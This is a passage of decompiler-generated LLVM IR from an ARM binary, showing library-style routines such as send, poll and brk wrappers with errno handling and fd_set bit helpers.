  %v4_135fc = add i32 %v2_135f8, %v3_135fc
  %v5_135fc = inttoptr i32 %v4_135fc to i8*
  %v6_135fc = load i8, i8* %v5_135fc, align 1
  %v1_13600 = and i8 %v6_135fc, 32
  %v2_13600 = icmp eq i8 %v1_13600, 0
  br i1 %v2_13600, label %dec_label_pc_13608, label %dec_label_pc_135e0

dec_label_pc_13608:                               ; preds = %dec_label_pc_135f4
  %v7_13608 = icmp eq i32 %v0_13608, 10
  br i1 %v7_13608, label %dec_label_pc_135e0, label %dec_label_pc_13610

dec_label_pc_13610:                               ; preds = %dec_label_pc_135e0, %dec_label_pc_13608, %dec_label_pc_135e8.preheader
  %v0_1361434 = phi i32 [ %v0_135e820, %dec_label_pc_135e8.preheader ], [ %v5_135e4, %dec_label_pc_135e0 ], [ %v2_135e4, %dec_label_pc_13608 ]
  %v0_13610 = load i32, i32* @r8, align 4
  %v1_13610 = add i32 %v0_13610, 1
  br label %dec_label_pc_13614

dec_label_pc_13614:                               ; preds = %dec_label_pc_13590, %dec_label_pc_13610
  %storemerge = phi i32 [ %v1_13610, %dec_label_pc_13610 ], [ 0, %dec_label_pc_13590 ]
  %v0_135a8 = phi i32 [ %v0_1361434, %dec_label_pc_13610 ], [ %v0_1361435, %dec_label_pc_13590 ]
  store i32 %storemerge, i32* @r8, align 4
  %v1_13614 = inttoptr i32 %v0_135a8 to i8*
  %v2_13614 = load i8, i8* %v1_13614, align 1
  %v3_13614 = zext i8 %v2_13614 to i32
  %v2_13618 = icmp eq i8 %v2_13614, 0
  br i1 %v2_13618, label %bb57, label %bb56

bb56:                                             ; preds = %dec_label_pc_13614
  br label %bb57

bb57:                                             ; preds = %dec_label_pc_13614, %bb56
  %v0_13628.pr = phi i32 [ %v3_13614, %dec_label_pc_13614 ], [ 1, %bb56 ]
  %v1_13620 = add i32 %storemerge, -4
  %v3_13620 = sub i32 3, %storemerge
  %v4_13620 = and i32 %v3_13620, %storemerge
  %v5_13620 = icmp slt i32 %v4_13620, 0
  %v6_13620 = icmp slt i32 %v1_13620, 0
  %v7_13620 = icmp eq i32 %storemerge, 4
  %v3_13624 = xor i1 %v6_13620, %v5_13620
  %v4_13624 = or i1 %v7_13620, %v3_13624
  br i1 %v4_13624, label %bb58, label %.thread5

.thread5:                                         ; preds = %bb57
  br label %dec_label_pc_13630

bb58:                                             ; preds = %bb57
  %v2_13628 = icmp eq i32 %v0_13628.pr, 0
  br i1 %v2_13628, label %dec_label_pc_13630, label %dec_label_pc_135a0

dec_label_pc_13630:                               ; preds = %bb58, %.thread5
  store i32 %tmp, i32* @r6, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_1815c.601 to i32), i32* @r1, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v4_1363c = call i32 @function_f010(i8* %v3_1363c, i32 ptrtoint ([11 x i8]* @global_var_1815c.601 to i32))
  store i32 %v4_1363c, i32* %r0.global-to-local, align 4
  %v2_13640 = icmp eq i32 %v4_1363c, 0
  br i1 %v2_13640, label %dec_label_pc_13668.preheader, label %dec_label_pc_1368c

dec_label_pc_13668.preheader:                     ; preds = %dec_label_pc_13630
  br label %dec_label_pc_13668

dec_label_pc_13650:                               ; preds = %dec_label_pc_13680
  %v1_13650 = add i32 %v5_13670, -36
  %v2_13650 = inttoptr i32 %v1_13650 to i32*
  %v3_13650 = load i32, i32* %v2_13650, align 4
  store i32 %v3_13650, i32* %r0.global-to-local, align 4
  %v1_13654 = call i32 @function_f4e0(i32 %v3_13650)
  store i32 %v1_13654, i32* %r0.global-to-local, align 4
  %v0_1365c = load i32, i32* @r4, align 4
  %v1_1365c = add i32 %v0_1365c, 1
  store i32 %v1_1365c, i32* %r2.global-to-local, align 4
  %v5_13660 = mul i32 %v0_1365c, 4
  %v6_13660 = add i32 %v5_13660, ptrtoint (i32* @global_var_22f00.438 to i32)
  %v7_13660 = inttoptr i32 %v6_13660 to i32*
  store i32 %v1_13654, i32* %v7_13660, align 4
  %v0_13664 = load i32, i32* %r2.global-to-local, align 4
  %v1_13664 = load i32, i32* @r7, align 4
  %v2_13664 = inttoptr i32 %v1_13664 to i32*
  store i32 %v0_13664, i32* %v2_13664, align 4
  %v0_1366c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_13668

dec_label_pc_13668:                               ; preds = %dec_label_pc_13668.preheader, %dec_label_pc_13650
  %v0_13678 = phi i32 [ 1, %dec_label_pc_13668.preheader ], [ %v0_1366c.pre, %dec_label_pc_13650 ]
  store i32 %v2_135a0, i32* %r2.global-to-local, align 4
  %v1_1366c = load i32, i32* @r8, align 4
  %v2_1366c = sub i32 %v0_13678, %v1_1366c
  %v4_1366c = xor i32 %v1_1366c, %v0_13678
  %v5_1366c = xor i32 %v2_1366c, %v0_13678
  %v6_1366c = and i32 %v5_1366c, %v4_1366c
  %v7_1366c = icmp slt i32 %v6_1366c, 0
  %v8_1366c = icmp slt i32 %v2_1366c, 0
  %v4_13670 = mul i32 %v0_13678, 4
  %v5_13670 = add i32 %v4_13670, %v2_135a0
  store i32 ptrtoint (i32* @global_var_22f0c.435 to i32), i32* @r7, align 4
  %v1_13678 = add i32 %v0_13678, 1
  store i32 %v1_13678, i32* @r5, align 4
  %v2_1367c = xor i1 %v8_1366c, %v7_1366c
  br i1 %v2_1367c, label %dec_label_pc_13680, label %dec_label_pc_1368c

dec_label_pc_13680:                               ; preds = %dec_label_pc_13668
  %v2_13680 = load i32, i32* @global_var_22f0c.435, align 4
  store i32 %v2_13680, i32* @r4, align 4
  %v7_13688 = icmp slt i32 %v2_13680, 3
  br i1 %v7_13688, label %dec_label_pc_13650, label %dec_label_pc_1368c

dec_label_pc_1368c:                               ; preds = %dec_label_pc_13668, %dec_label_pc_13680, %dec_label_pc_13630
  %v0_1368c = load i32, i32* @r6, align 4
  store i32 %v0_1368c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_18168.604 to i32), i32* @r1, align 4
  %v3_13694 = inttoptr i32 %v0_1368c to i8*
  %v4_13694 = call i32 @function_f010(i8* %v3_13694, i32 ptrtoint ([7 x i8]* @global_var_18168.604 to i32))
  store i32 %v4_13694, i32* %r0.global-to-local, align 4
  %v2_13698 = icmp eq i32 %v4_13694, 0
  br i1 %v2_13698, label %dec_label_pc_136d0.preheader, label %dec_label_pc_136a0

dec_label_pc_136a0:                               ; preds = %dec_label_pc_1368c
  %v0_136a0 = load i32, i32* @r6, align 4
  store i32 %v0_136a0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_18170.606 to i32), i32* @r1, align 4
  %v3_136a8 = inttoptr i32 %v0_136a0 to i8*
  %v4_136a8 = call i32 @function_f010(i8* %v3_136a8, i32 ptrtoint ([7 x i8]* @global_var_18170.606 to i32))
  store i32 %v4_136a8, i32* %r0.global-to-local, align 4
  %v2_136ac = icmp eq i32 %v4_136a8, 0
  br i1 %v2_136ac, label %dec_label_pc_136d0.preheader, label %dec_label_pc_1372c.backedge

dec_label_pc_136d0.preheader:                     ; preds = %dec_label_pc_1368c, %dec_label_pc_136a0
  store i32 ptrtoint (i32* @global_var_22f10.581 to i32), i32* @r4, align 4
  %v2_136d460 = load i32, i32* @global_var_22f10.581, align 4
  store i32 ptrtoint (i32* @global_var_22ef0.585 to i32), i32* @r5, align 4
  %v1_136e063 = add i32 %v2_136d460, -1
  store i32 %v1_136e063, i32* %r2.global-to-local, align 4
  %tmp5964 = icmp slt i32 %v2_136d460, 1
  br i1 %tmp5964, label %dec_label_pc_136e8, label %dec_label_pc_136b8

dec_label_pc_136b8:                               ; preds = %dec_label_pc_136d0.preheader, %dec_label_pc_136b8
  %v1_136e065 = phi i32 [ %v1_136e0, %dec_label_pc_136b8 ], [ %v1_136e063, %dec_label_pc_136d0.preheader ]
  %v4_136b8 = mul i32 %v1_136e065, 4
  %v5_136b8 = add i32 %v4_136b8, ptrtoint (i32* @global_var_22ef0.585 to i32)
  %v6_136b8 = inttoptr i32 %v5_136b8 to i32*
  %v7_136b8 = load i32, i32* %v6_136b8, align 4
  store i32 %v7_136b8, i32* @r0, align 4
  store i32 %v1_136e065, i32* @global_var_22f10.581, align 4
  %v0_136c0 = call i32 @function_fdcc()
  store i32 %v0_136c0, i32* %r0.global-to-local, align 4
  %v0_136c4 = load i32, i32* @r4, align 4
  %v1_136c4 = inttoptr i32 %v0_136c4 to i32*
  %v2_136c4 = load i32, i32* %v1_136c4, align 4
  %v1_136cc = load i32, i32* @r5, align 4
  %v5_136cc = mul i32 %v2_136c4, 4
  %v6_136cc = add i32 %v1_136cc, %v5_136cc
  %v7_136cc = inttoptr i32 %v6_136cc to i32*
  store i32 0, i32* %v7_136cc, align 4
  store i32 ptrtoint (i32* @global_var_22f10.581 to i32), i32* @r4, align 4
  %v2_136d4 = load i32, i32* @global_var_22f10.581, align 4
  store i32 ptrtoint (i32* @global_var_22ef0.585 to i32), i32* @r5, align 4
  %v1_136e0 = add i32 %v2_136d4, -1
  store i32 %v1_136e0, i32* %r2.global-to-local, align 4
  %tmp59 = icmp slt i32 %v2_136d4, 1
  br i1 %tmp59, label %dec_label_pc_136e8, label %dec_label_pc_136b8

dec_label_pc_136e8:                               ; preds = %dec_label_pc_136b8, %dec_label_pc_136d0.preheader
  br label %dec_label_pc_13708

dec_label_pc_136f0:                               ; preds = %dec_label_pc_13720
  %v1_136f0 = add i32 %v5_13710, -36
  %v2_136f0 = inttoptr i32 %v1_136f0 to i32*
  %v3_136f0 = load i32, i32* %v2_136f0, align 4
  store i32 %v3_136f0, i32* %r0.global-to-local, align 4
  %v1_136f4 = call i32 @function_f4e0(i32 %v3_136f0)
  store i32 %v1_136f4, i32* %r0.global-to-local, align 4
  %v0_136fc = load i32, i32* @r4, align 4
  %v1_136fc = add i32 %v0_136fc, 1
  store i32 %v1_136fc, i32* %r2.global-to-local, align 4
  %v5_13700 = mul i32 %v0_136fc, 4
  %v6_13700 = add i32 %v5_13700, ptrtoint (i32* @global_var_22ef0.585 to i32)
  %v7_13700 = inttoptr i32 %v6_13700 to i32*
  store i32 %v1_136f4, i32* %v7_13700, align 4
  %v0_13704 = load i32, i32* %r2.global-to-local, align 4
  %v1_13704 = load i32, i32* @r6, align 4
  %v2_13704 = inttoptr i32 %v1_13704 to i32*
  store i32 %v0_13704, i32* %v2_13704, align 4
  %v0_1370c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_13708

dec_label_pc_13708:                               ; preds = %dec_label_pc_136e8, %dec_label_pc_136f0
  %v0_13718 = phi i32 [ 1, %dec_label_pc_136e8 ], [ %v0_1370c.pre, %dec_label_pc_136f0 ]
  store i32 %v2_135a0, i32* %r2.global-to-local, align 4
  %v1_1370c = load i32, i32* @r8, align 4
  %v2_1370c = sub i32 %v0_13718, %v1_1370c
  %v4_1370c = xor i32 %v1_1370c, %v0_13718
  %v5_1370c = xor i32 %v2_1370c, %v0_13718
  %v6_1370c = and i32 %v5_1370c, %v4_1370c
  %v7_1370c = icmp slt i32 %v6_1370c, 0
  %v8_1370c = icmp slt i32 %v2_1370c, 0
  %v4_13710 = mul i32 %v0_13718, 4
  %v5_13710 = add i32 %v4_13710, %v2_135a0
  store i32 ptrtoint (i32* @global_var_22f10.581 to i32), i32* @r6, align 4
  %v1_13718 = add i32 %v0_13718, 1
  store i32 %v1_13718, i32* @r5, align 4
  %v2_1371c = xor i1 %v8_1370c, %v7_1370c
  br i1 %v2_1371c, label %dec_label_pc_13720, label %dec_label_pc_1372c.backedge

dec_label_pc_13720:                               ; preds = %dec_label_pc_13708
  %v2_13720 = load i32, i32* @global_var_22f10.581, align 4
  store i32 %v2_13720, i32* @r4, align 4
  %v7_13728 = icmp slt i32 %v2_13720, 4
  br i1 %v7_13728, label %dec_label_pc_136f0, label %dec_label_pc_1372c.backedge

dec_label_pc_1355c.preheader:                     ; preds = %dec_label_pc_1355c.preheader.lr.ph, %dec_label_pc_1372c.backedge
  store i32 %v2_134f0, i32* %r0.global-to-local, align 4
  %v2_1355c12 = load i8, i8* %v1_1355c11, align 4
  %v3_1355c13 = zext i8 %v2_1355c12 to i32
  store i32 %v3_1355c13, i32* %r2.global-to-local, align 4
  %v2_1356014 = icmp eq i8 %v2_1355c12, 0
  br i1 %v2_1356014, label %dec_label_pc_1357c, label %dec_label_pc_13568.lr.ph

dec_label_pc_13568.lr.ph:                         ; preds = %dec_label_pc_1355c.preheader
  %v2_1356c.pre = load i32, i32* @global_var_205f0, align 4
  br label %dec_label_pc_13568

dec_label_pc_1374c:                               ; preds = %dec_label_pc_1372c.backedge, %dec_label_pc_1372c.preheader
  %v0_1374c = load i32, i32* @sl, align 4
  store i32 %v0_1374c, i32* %r0.global-to-local, align 4
  %v1_13750 = inttoptr i32 %v0_1374c to i8*
  %v2_13750 = call i32 @function_ced0(i8* %v1_13750)
  store i32 %v2_13750, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13764

dec_label_pc_13758:                               ; preds = %dec_label_pc_13540
  %v0_13758 = call i32 @function_11514()
  store i32 %v0_13758, i32* %r0.global-to-local, align 4
  %v2_13760 = inttoptr i32 %v0_13758 to i32*
  store i32 3, i32* %v2_13760, align 4
  br label %dec_label_pc_13764

dec_label_pc_13764:                               ; preds = %dec_label_pc_134ec, %dec_label_pc_1374c, %dec_label_pc_13758
  store i32 %v2_134f4, i32* @r0, align 4
  %v1_13774 = call i32 @function_10d54()
  store i32 %v1_13774, i32* %r0.global-to-local, align 4
  store i32 %v6_134ec, i32* @r5, align 4
  store i32 %v9_134ec, i32* @r6, align 4
  store i32 %v12_134ec, i32* @r7, align 4
  store i32 %v15_134ec, i32* @r8, align 4
  store i32 %v18_134ec, i32* @sl, align 4
  ret i32 %v1_13774

; uselistorder directives
  uselistorder i32 %v3_1355c13, { 2, 1, 0 }
  uselistorder i32 %v2_1370c, { 1, 0 }
  uselistorder i32 %v0_13718, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v1_136e0, { 1, 0 }
  uselistorder i32 %v1_136e065, { 1, 0 }
  uselistorder i32 %v2_1366c, { 1, 0 }
  uselistorder i32 %v0_13678, { 2, 3, 0, 1, 4 }
  uselistorder i32 %v0_135a8, { 1, 0 }
  uselistorder i32 %storemerge, { 3, 0, 1, 2, 5, 4 }
  uselistorder i32 %v0_135e820, { 1, 0, 2 }
  uselistorder i32 %v2_135a0, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v2_134f0, { 5, 6, 8, 7, 3, 4, 0, 1, 2 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 15, 11, 9, 10, 12, 1, 2, 13, 14, 3, 17, 4, 16, 5, 7, 6, 0, 8 }
  uselistorder i32* %r0.global-to-local, { 20, 2, 22, 21, 13, 28, 23, 24, 26, 25, 4, 27, 6, 5, 14, 7, 8, 11, 9, 12, 16, 15, 10, 0, 3, 17, 19, 1, 18 }
  uselistorder i32 ()* @function_11514, { 0, 4, 3, 2, 5, 1 }
  uselistorder i32 ()* @function_fdcc, { 1, 15, 14, 13, 12, 11, 10, 21, 20, 9, 8, 7, 6, 5, 0, 17, 16, 4, 3, 19, 18, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_22ef0.585 to i32), { 3, 5, 1, 0, 4, 2 }
  uselistorder i32* @global_var_22f10.581, { 2, 3, 1, 0, 7, 4, 5, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_22f10.581 to i32), { 1, 2, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_22f00.438 to i32), { 1, 0, 2 }
  uselistorder i8 32, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10, 13, 12, 14, 11 }
  uselistorder i32* @global_var_22f0c.435, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_13764, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1355c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_13708, { 1, 0 }
  uselistorder label %dec_label_pc_136b8, { 1, 0 }
  uselistorder label %dec_label_pc_136d0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1368c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13668, { 1, 0 }
  uselistorder label %bb57, { 1, 0 }
  uselistorder label %dec_label_pc_13614, { 1, 0 }
  uselistorder label %dec_label_pc_13610, { 1, 0, 2 }
  uselistorder label %dec_label_pc_135f4, { 1, 0 }
  uselistorder label %dec_label_pc_135e0, { 1, 0 }
  uselistorder label %dec_label_pc_135c0, { 1, 0 }
  uselistorder label %dec_label_pc_1372c.backedge, { 1, 0, 3, 5, 2, 4 }
  uselistorder label %dec_label_pc_1357c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1372c.preheader, { 1, 0 }
}

define i32 @function_137c0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_137c0:
  store i32 %arg2, i32* @lr, align 4
  store i32 %arg1, i32* @r1, align 4
  store i32 0, i32* @r0, align 4
  store i32 %arg2, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v0_137fc = call i32 @function_1486c()
  ret i32 %v0_137fc
}

define i32 @function_13808(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_13808:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13808 = load i32, i32* @r4, align 4
  store i32 %v3_13808, i32* %stack_var_-8, align 4
  %v5_1380c = call i32 @send(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4)
  store i32 %v5_1380c, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_1380c, -4095
  br i1 %tmp, label %dec_label_pc_1382c, label %dec_label_pc_1381c

dec_label_pc_1381c:                               ; preds = %dec_label_pc_13808
  %v0_1381c = call i32 @function_cec4()
  %v0_13820 = load i32, i32* %r4.global-to-local, align 4
  %v1_13820 = sub i32 0, %v0_13820
  %v2_13824 = inttoptr i32 %v0_1381c to i32*
  store i32 %v1_13820, i32* %v2_13824, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1382c

dec_label_pc_1382c:                               ; preds = %dec_label_pc_13808, %dec_label_pc_1381c
  %v0_1382c = phi i32 [ %v5_1380c, %dec_label_pc_13808 ], [ -1, %dec_label_pc_1381c ]
  %v2_13830 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13830, i32* %r4.global-to-local, align 4
  ret i32 %v0_1382c

; uselistorder directives
  uselistorder i32 %v5_1380c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1382c, { 1, 0 }
}

define i32 @function_13834(i32 %arg1) local_unnamed_addr {
dec_label_pc_13834:
  %v3_13834 = load i32, i32* @r4, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_1383c = call i32 @function_cd2c()
  %v0_13840 = load i32, i32* @r4, align 4
  store i32 %v3_13834, i32* @r4, align 4
  %v2_13848 = call i32 @function_cdd4(i32 %v0_1383c, i32 %v0_13840)
  ret i32 %v2_13848
}

define i32 @function_1384c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1384c:
  %v1_1384c = add i32 %arg2, -1
  %v3_13850 = udiv i32 %v1_1384c, 32
  %v4_13854 = mul nuw nsw i32 %v3_13850, 4
  %v5_13854 = add i32 %v4_13854, %arg1
  %v6_13854 = inttoptr i32 %v5_13854 to i32*
  %v7_13854 = load i32, i32* %v6_13854, align 4
  %v1_13858 = urem i32 %v1_1384c, 32
  %v7_13860 = shl i32 1, %v1_13858
  %v8_13860 = and i32 %v7_13854, %v7_13860
  %v10_13860 = icmp ne i32 %v8_13860, 0
  %. = zext i1 %v10_13860 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v1_1384c, { 1, 0 }
}

define i32 @function_13870(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13870:
  %v1_13870 = add i32 %arg2, -1
  %v3_13874 = udiv i32 %v1_13870, 32
  %v4_13878 = mul nuw nsw i32 %v3_13874, 4
  %v5_13878 = add i32 %v4_13878, %arg1
  %v6_13878 = inttoptr i32 %v5_13878 to i32*
  %v7_13878 = load i32, i32* %v6_13878, align 4
  %v1_1387c = urem i32 %v1_13870, 32
  %v7_13884 = shl i32 1, %v1_1387c
  %v8_13884 = or i32 %v7_13878, %v7_13884
  store i32 %v8_13884, i32* %v6_13878, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_13870, { 1, 0 }
}

define i32 @function_13894(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13894:
  %v1_13894 = add i32 %arg2, -1
  %v3_13898 = udiv i32 %v1_13894, 32
  %v4_1389c = mul nuw nsw i32 %v3_13898, 4
  %v5_1389c = add i32 %v4_1389c, %arg1
  %v6_1389c = inttoptr i32 %v5_1389c to i32*
  %v7_1389c = load i32, i32* %v6_1389c, align 4
  %v1_138a0 = urem i32 %v1_13894, 32
  %tmp = shl i32 -1, %v1_138a0
  %v8_138a8 = add i32 %tmp, -1
  %v9_138a8 = and i32 %v7_1389c, %v8_138a8
  store i32 %v9_138a8, i32* %v6_1389c, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_13894, { 1, 0 }
}

define i32 @function_138b8(i32 %arg1) local_unnamed_addr {
dec_label_pc_138b8:
  %v1_138b8 = add i32 %arg1, 28
  %v2_138b8 = inttoptr i32 %v1_138b8 to i32*
  %v3_138b8 = load i32, i32* %v2_138b8, align 4
  %v1_138c0 = add i32 %arg1, 44
  %v2_138c0 = inttoptr i32 %v1_138c0 to i32*
  %v3_138c0 = load i32, i32* %v2_138c0, align 4
  store i32 %v3_138b8, i32* @global_var_22f14.611, align 4
  store i32 %v3_138c0, i32* @global_var_22f18.613, align 4
  ret i32 %arg1
}

define i32 @function_138dc(i32* %arg1) local_unnamed_addr {
dec_label_pc_138dc:
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_138e4 = call i32 @brk(i32* %arg1)
  %v3_138e8 = icmp ult i32 %v2_138e4, %tmp
  store i32 %v2_138e4, i32* @global_var_22cb4.542, align 4
  br i1 %v3_138e8, label %dec_label_pc_138fc, label %dec_label_pc_1390c

dec_label_pc_138fc:                               ; preds = %dec_label_pc_138dc
  %v0_138fc = call i32 @function_cec4()
  %v2_13904 = inttoptr i32 %v0_138fc to i32*
  store i32 12, i32* %v2_13904, align 4
  br label %dec_label_pc_1390c

dec_label_pc_1390c:                               ; preds = %dec_label_pc_138dc, %dec_label_pc_138fc
  %v0_1390c = phi i32 [ 0, %dec_label_pc_138dc ], [ -1, %dec_label_pc_138fc ]
  ret i32 %v0_1390c

; uselistorder directives
  uselistorder i32* @global_var_22cb4.542, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1390c, { 1, 0 }
}

define i32 @function_13918() local_unnamed_addr {
dec_label_pc_13918:
  %stack_var_-8 = alloca i32, align 4
  %v3_13918 = load i32, i32* @r4, align 4
  store i32 %v3_13918, i32* %stack_var_-8, align 4
  %v0_1391c = load i32, i32* @r0, align 4
  %v0_13920 = call i32 @function_cec4()
  %v1_13924 = sub i32 0, %v0_1391c
  %v2_13928 = inttoptr i32 %v0_13920 to i32*
  store i32 %v1_13924, i32* %v2_13928, align 4
  %v2_13930 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13930, i32* @r4, align 4
  ret i32 -1
}

define i32 @function_13934(%pollfd* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_13934:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13934 = load i32, i32* @r4, align 4
  store i32 %v3_13934, i32* %stack_var_-8, align 4
  %v5_13938 = call i32 @poll(%pollfd* %arg1, i32 %arg2, i32 %arg3)
  store i32 %v5_13938, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_13938, -4095
  br i1 %tmp, label %dec_label_pc_13958, label %dec_label_pc_13948

dec_label_pc_13948:                               ; preds = %dec_label_pc_13934
  %v0_13948 = call i32 @function_cec4()
  %v0_1394c = load i32, i32* %r4.global-to-local, align 4
  %v1_1394c = sub i32 0, %v0_1394c
  %v2_13950 = inttoptr i32 %v0_13948 to i32*
  store i32 %v1_1394c, i32* %v2_13950, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13958

dec_label_pc_13958:                               ; preds = %dec_label_pc_13934, %dec_label_pc_13948
  %v0_13958 = phi i32 [ %v5_13938, %dec_label_pc_13934 ], [ -1, %dec_label_pc_13948 ]
  %v2_1395c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1395c, i32* @r4, align 4
  ret i32 %v0_13958

; uselistorder directives
  uselistorder i32 %v5_13938, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13958, { 1, 0 }
}

define i32 @function_13960() local_unnamed_addr {
dec_label_pc_13960:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_13960 = load i32, i32* @r2, align 4
  store i32 %v0_13960, i32* %r3.global-to-local, align 4
  %v0_13964 = load i32, i32* @r1, align 4
  %v3_13964 = ashr i32 %v0_13964, 31
  store i32 %v3_13964, i32* %r2.global-to-local, align 4
  %v3_1396c = load i32, i32* @r4, align 4
  %v6_1396c = load i32, i32* @r5, align 4
  %v9_1396c = load i32, i32* @r6, align 4
  %v2_13974 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v0_13960, i32* @r6, align 4
  %v0_1397c = load i32, i32* @r0, align 4
  store i32 %v0_1397c, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_13960, 3
  br i1 %tmp, label %dec_label_pc_13998, label %dec_label_pc_13984

dec_label_pc_13984:                               ; preds = %dec_label_pc_13960
  %v0_13984 = call i32 @function_cec4()
  store i32 %v0_13984, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v2_13990 = inttoptr i32 %v0_13984 to i32*
  store i32 22, i32* %v2_13990, align 4
  br label %.thread3

dec_label_pc_13998:                               ; preds = %dec_label_pc_13960
  %v1_13998 = add i32 %v0_1397c, 52
  %v2_13998 = inttoptr i32 %v1_13998 to i32*
  %v3_13998 = load i32, i32* %v2_13998, align 4
  store i32 %v3_13998, i32* %r7.global-to-local, align 4
  %v2_1399c = icmp eq i32 %v3_13998, 0
  store i32 %v0_13964, i32* %stack_var_-28, align 4
  br i1 %v2_1399c, label %dec_label_pc_139ac, label %dec_label_pc_139d8

dec_label_pc_139ac:                               ; preds = %dec_label_pc_13998
  %v1_139ac = add i32 %v0_1397c, 56
  store i32 %v1_139ac, i32* @r4, align 4
  store i32 68948, i32* %r3.global-to-local, align 4
  store i32 %v2_13974, i32* @r0, align 4
  store i32 %v1_139ac, i32* %r2.global-to-local, align 4
  %v1_139c4 = call i32 @function_10d54()
  %v0_139c8 = load i32, i32* @r4, align 4
  store i32 %v0_139c8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_10d4c.283 to i32), i32* %r3.global-to-local, align 4
  store i32 80344, i32* @lr, align 4
  %v1_139d4 = call i32 @function_10d4c()
  store i32 %v1_139d4, i32* %r0.global-to-local, align 4
  %v0_139d8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_139d8

dec_label_pc_139d8:                               ; preds = %dec_label_pc_13998, %dec_label_pc_139ac
  %v0_139e4 = phi i32 [ %v0_1397c, %dec_label_pc_13998 ], [ %v0_139d8.pre, %dec_label_pc_139ac ]
  %v1_139d8 = inttoptr i32 %v0_139e4 to i8*
  %v2_139d8 = load i8, i8* %v1_139d8, align 1
  %v3_139d8 = zext i8 %v2_139d8 to i32
  store i32 %v3_139d8, i32* %r3.global-to-local, align 4
  %v1_139dc = and i32 %v3_139d8, 64
  %v2_139dc = icmp eq i32 %v1_139dc, 0
  br i1 %v2_139dc, label %dec_label_pc_139f4, label %dec_label_pc_139e4

dec_label_pc_139e4:                               ; preds = %dec_label_pc_139d8
  store i32 %v0_139e4, i32* @r0, align 4
  %v0_139e8 = call i32 @function_d8c8()
  store i32 %v0_139e8, i32* %r0.global-to-local, align 4
  %v2_139ec = icmp eq i32 %v0_139e8, 0
  br i1 %v2_139ec, label %dec_label_pc_139f4, label %dec_label_pc_13a64

dec_label_pc_139f4:                               ; preds = %dec_label_pc_139e4, %dec_label_pc_139d8
  %v0_139f4 = load i32, i32* @r6, align 4
  %v7_139f4 = icmp eq i32 %v0_139f4, 1
  br i1 %v7_139f4, label %dec_label_pc_139fc, label %dec_label_pc_139f4.dec_label_pc_13a10_crit_edge

dec_label_pc_139f4.dec_label_pc_13a10_crit_edge:  ; preds = %dec_label_pc_139f4
  br label %dec_label_pc_13a10

dec_label_pc_139fc:                               ; preds = %dec_label_pc_139f4
  %v0_139fc = load i32, i32* @r5, align 4
  store i32 %v0_139fc, i32* %r0.global-to-local, align 4
  %v2_13a00 = ptrtoint i32* %stack_var_-28 to i32
  %v2_13a04 = inttoptr i32 %v0_139fc to i8*
  %v3_13a04 = call i32 @function_13af8(i8* %v2_13a04, i32 %v2_13a00)
  store i32 %v3_13a04, i32* %r0.global-to-local, align 4
  %v1_13a08 = icmp slt i32 %v3_13a04, 0
  br i1 %v1_13a08, label %dec_label_pc_13a64, label %dec_label_pc_139fc.dec_label_pc_13a10_crit_edge

